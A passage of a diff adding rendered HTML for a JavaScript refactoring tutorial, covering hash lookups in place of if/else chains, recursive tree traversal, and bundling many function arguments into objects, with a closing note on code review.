+    <span class="mi">5</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">Plang</span><span class="dl">"</span><span class="p">,</span>
+    <span class="mi">7</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">Plong</span><span class="dl">"</span>
+  <span class="p">};</span>
+</code></pre></div></div>
+<p>So now a dozen-ish if statements are down to one. Is this the best solution for this problem? Maybe not. But the hash method can be a useful refactoring tool.</p>
+
+<h4 id="recursion">Recursion</h4>
+
+<p>Sometimes a hopelessly complex <code class="highlighter-rouge">if/else</code> branching sequence can be solved with some light recursion. Think about the <a href="https://en.wikipedia.org/wiki/Binary_search_tree">binary search tree</a>. To do an in-order traversal of a tree, you could use an algorithm like the one below. This is bad enough in pseudocode, so let’s leave JavaScript out of it for the moment.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>start at the top of the tree
+go left until you can't go left anymore, and carry around an index
+  to keep track of how far down you are going
+once at the bottom, put that value in your collection array
+go right (up) one
+is there a node to the right?
+  yes: go there
+    go left until you can't go left anymore
+    ...
+  no: add to collection
+go right (up) one ...
+...
+</code></pre></div></div>
+
+<p>It is complex and messy, but it will work. Eventually.</p>
+
+<p>Or you could:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">traverse</span><span class="p">(</span><span class="nx">start</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">start</span> <span class="o">=</span> <span class="nx">start</span> <span class="o">||</span> <span class="nx">root</span>
+  <span class="k">if</span><span class="p">(</span><span class="nx">start</span> <span class="o">===</span> <span class="kc">null</span><span class="p">){</span> <span class="k">return</span><span class="p">;</span> <span class="p">}</span>
+  <span class="k">return</span> <span class="nx">traverse</span><span class="p">(</span><span class="nx">start</span><span class="p">.</span><span class="nx">left</span><span class="p">)</span>
+         <span class="p">.</span><span class="nx">concat</span><span class="p">([</span><span class="nx">start</span><span class="p">.</span><span class="nx">data</span><span class="p">])</span>
+         <span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="nx">traverse</span><span class="p">(</span><span class="nx">start</span><span class="p">.</span><span class="nx">right</span><span class="p">));</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>And that’s it.</p>
+
+<p>So, break your if/elses into functions/objects if you can, look for patterns and making the problem easier, and see if recursion can help as well.</p>
+
+<h4 id="passing-too-many-arguments-to-a-function">Passing Too Many Arguments to a Function</h4>
+
+<p>We have all been there, you’re on the one yard line… that function is almost complete… and then it hits you: You have to pass in ten variables to this ONE FUNCTION. You hit the ground on your knees, throw your hands in the air, and napalm blows up behind you like the classic cover to the hit 1986 drama Platoon. Not anymore. We are here; it’s all ok. We will be taking you on a journey through time and space, and also demonsrating solutions to this age-old issue.</p>
+
+<p>We will be going into the most common solution to this problem: putting the variables into an object.</p>
+
+<h5 id="quick-and-dirty-hash">Quick and dirty hash</h5>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="k">case</span> <span class="dl">"</span><span class="s2">inGame</span><span class="dl">"</span><span class="p">:</span>
+          <span class="nx">inGame</span><span class="p">(</span><span class="nx">context</span><span class="p">,</span> <span class="nx">gameSize</span><span class="p">,</span> <span class="nx">game</span><span class="p">,</span> <span class="nx">fireSpeed</span><span class="p">,</span> <span class="nx">fireRate</span><span class="p">,</span> <span class="nx">counter</span><span class="p">);</span>
+          <span class="nx">counter</span><span class="o">++</span><span class="p">;</span>
+          <span class="nx">requestAnimationFrame</span><span class="p">(</span><span class="nx">tick</span><span class="p">);</span>
+
+          <span class="kd">function</span> <span class="nx">inGame</span><span class="p">(</span><span class="nx">context</span><span class="p">,</span> <span class="nx">gameSize</span><span class="p">,</span> <span class="nx">game</span><span class="p">,</span> <span class="nx">fireSpeed</span><span class="p">,</span> <span class="nx">fireRate</span><span class="p">,</span> <span class="nx">counter</span><span class="p">){</span>
+		 <span class="nx">game</span><span class="p">.</span><span class="nx">level</span><span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">game</span><span class="p">,</span> <span class="nx">fireSpeed</span><span class="p">,</span> <span class="nx">fireRate</span><span class="p">);</span>
+		 <span class="nx">context</span><span class="p">.</span><span class="nx">clearRect</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">gameSize</span><span class="p">.</span><span class="nx">x</span><span class="p">,</span> <span class="nx">gameSize</span><span class="p">.</span><span class="nx">y</span><span class="p">);</span>
+  		 <span class="nx">drawObject</span><span class="p">(</span><span class="nx">context</span><span class="p">,</span> <span class="nx">game</span><span class="p">,</span> <span class="nx">counter</span><span class="p">);</span>
+		 <span class="nx">update</span><span class="p">(</span><span class="nx">game</span><span class="p">);</span>
+		<span class="p">}</span>
+</code></pre></div></div>
+
+<p>becomes</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">case</span> <span class="dl">"</span><span class="s2">inGame</span><span class="dl">"</span><span class="p">:</span>
+     <span class="nx">inGame</span><span class="p">({</span><span class="na">context</span><span class="p">:</span> <span class="nx">context</span><span class="p">,</span> <span class="na">gameSize</span><span class="p">:</span> <span class="nx">gameSize</span><span class="p">,</span> <span class="na">game</span><span class="p">:</span> <span class="nx">game</span><span class="p">,</span>
+        <span class="na">fireSpeed</span><span class="p">:</span> <span class="nx">fireSpeed</span><span class="p">,</span> <span class="na">fireRate</span><span class="p">:</span> <span class="nx">fireRate</span><span class="p">,</span> <span class="na">counter</span><span class="p">:</span> <span class="nx">counter</span><span class="p">});</span>
+        <span class="nx">counter</span><span class="o">++</span><span class="p">;</span>
+        <span class="nx">requestAnimationFrame</span><span class="p">(</span><span class="nx">tick</span><span class="p">);</span>
+
+        <span class="kd">function</span> <span class="nx">inGame</span><span class="p">(</span><span class="nx">data</span><span class="p">){</span>
+	  <span class="nx">game</span><span class="p">.</span><span class="nx">level</span><span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">game</span><span class="p">,</span> <span class="nx">data</span><span class="p">.</span><span class="nx">fireSpeed</span><span class="p">,</span> <span class="nx">data</span><span class="p">.</span><span class="nx">fireRate</span><span class="p">);</span>
+	  <span class="nx">context</span><span class="p">.</span><span class="nx">clearRect</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">data</span><span class="p">.</span><span class="nx">gameSize</span><span class="p">.</span><span class="nx">x</span><span class="p">,</span> <span class="nx">data</span><span class="p">.</span><span class="nx">gameSize</span><span class="p">.</span><span class="nx">y</span><span class="p">);</span>
+          <span class="nx">drawObject</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">context</span><span class="p">,</span> <span class="nx">data</span><span class="p">.</span><span class="nx">game</span><span class="p">,</span> <span class="nx">data</span><span class="p">.</span><span class="nx">counter</span><span class="p">);</span>
+          <span class="nx">update</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">game</span><span class="p">);</span>
+	<span class="p">}</span>
+</code></pre></div></div>
+<p>This can get messy if your variables are too varied.</p>
+
+<h5 id="break-objects-into-more-logical-components">Break objects into more logical components</h5>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="kd">let</span> <span class="nx">Game</span> <span class="o">=</span> <span class="p">{</span><span class="na">game</span><span class="p">:</span> <span class="nx">game</span><span class="p">,</span> <span class="na">gameSize</span><span class="p">:</span> <span class="nx">gameSize</span><span class="p">}</span>
+   <span class="kd">let</span> <span class="nx">Fire</span> <span class="o">=</span> <span class="p">{</span><span class="na">fireSpeed</span><span class="p">:</span> <span class="nx">fireSpeed</span><span class="p">,</span> <span class="na">fireRate</span><span class="p">:</span> <span class="nx">fireRate</span><span class="p">}</span>
+
+      	<span class="k">case</span> <span class="dl">"</span><span class="s2">inGame</span><span class="dl">"</span><span class="p">:</span>
+          <span class="nx">inGame</span><span class="p">(</span><span class="nx">context</span><span class="p">,</span> <span class="nx">Game</span><span class="p">,</span> <span class="nx">Fire</span><span class="p">,</span> <span class="nx">counter</span><span class="p">);</span>
+          <span class="nx">counter</span><span class="o">++</span><span class="p">;</span>
+          <span class="nx">requestAnimationFrame</span><span class="p">(</span><span class="nx">tick</span><span class="p">);</span>
+
+          <span class="kd">function</span> <span class="nx">inGame</span><span class="p">(</span><span class="nx">context</span><span class="p">,</span> <span class="nx">Game</span><span class="p">,</span> <span class="nx">Fire</span><span class="p">,</span> <span class="nx">counter</span><span class="p">){</span>
+		 <span class="nx">game</span><span class="p">.</span><span class="nx">level</span><span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">Game</span><span class="p">.</span><span class="nx">game</span><span class="p">,</span> <span class="nx">Fire</span><span class="p">.</span><span class="nx">fireSpeed</span><span class="p">,</span> <span class="nx">Fire</span><span class="p">.</span><span class="nx">fireRate</span><span class="p">);</span>
+		 <span class="nx">context</span><span class="p">.</span><span class="nx">clearRect</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">Game</span><span class="p">.</span><span class="nx">gameSize</span><span class="p">.</span><span class="nx">x</span><span class="p">,</span> <span class="nx">Game</span><span class="p">.</span><span class="nx">gameSize</span><span class="p">.</span><span class="nx">y</span><span class="p">);</span>
+  		 <span class="nx">drawObject</span><span class="p">(</span><span class="nx">context</span><span class="p">,</span> <span class="nx">Game</span><span class="p">.</span><span class="nx">game</span><span class="p">,</span> <span class="nx">counter</span><span class="p">);</span>
+		 <span class="nx">update</span><span class="p">(</span><span class="nx">game</span><span class="p">);</span>
+		<span class="p">}</span>
+</code></pre></div></div>
+
+<p>While this approach created more arguments, they’re more logically broken out.</p>
+
+<h5 id="rethink-the-structure-of-your-code">Rethink the structure of your code.</h5>
+<p>If breaking your arguments into logical objects does not make sense, or there are simply too many arguments
+you may want in order to break up the responsiblity of your functions.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="k">case</span> <span class="dl">"</span><span class="s2">inGame</span><span class="dl">"</span><span class="p">:</span>
+          <span class="nx">inGame</span><span class="p">(</span><span class="nx">context</span><span class="p">,</span> <span class="nx">gameSize</span><span class="p">,</span> <span class="nx">game</span><span class="p">,</span> <span class="nx">fireSpeed</span><span class="p">,</span> <span class="nx">fireRate</span><span class="p">,</span> <span class="nx">counter</span><span class="p">);</span>
+          <span class="nx">inGameUpdateLevel</span><span class="p">(</span><span class="nx">game</span><span class="p">,</span> <span class="nx">fireSpeed</span><span class="p">,</span> <span class="nx">fireRate</span><span class="p">);</span>
+          <span class="nx">inGameClearCxt</span><span class="p">(</span><span class="nx">gamesize</span><span class="p">);</span>
+          <span class="nx">inGameDrawObjt</span><span class="p">(</span><span class="nx">context</span><span class="p">,</span> <span class="nx">game</span><span class="p">,</span> <span class="nx">counter</span><span class="p">):</span>
+          <span class="nx">inGame</span><span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">game</span><span class="p">);</span>
+          <span class="nx">counter</span><span class="o">++</span><span class="p">;</span>
+          <span class="nx">requestAnimationFrame</span><span class="p">(</span><span class="nx">tick</span><span class="p">);</span>
+</code></pre></div></div>
+
+<h2 id="your-turn">Your Turn</h2>
+
+<p>Your mission now is to spend time refactoring your project.</p>
+
+<p><strong>A Note on Refactoring</strong></p>
+
+<p>One of the best things about working as a programmer is working with other programmers. We all make mistakes in our code, from Linus Torvalds to <a href="https://twitter.com/SwiftOnSecurity?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor">InfoSec Taylor Swift</a> to some guy named Fred who just finished a Code School course and added ‘software developer’ to his LinkedIn profile. It’s impossible to know every trick and best practice, and even if you did, you’d still make silly code mistakes in the heat of the moment.</p>
+
+<p>This is why we pair program and have code reviews.</p>
+
+<p>The examples that we pull out in this tutorial are the kinds that every programmer makes. Sometimes it takes a second set of eyes to see where improvements can be made. You’ll see them in your code, your classmates’ code, your instructors’ code, your boss’s code… etc.</p>
+
+<p>Never be afraid to make a mistake - that’s what you learn from!</p>
+:ET
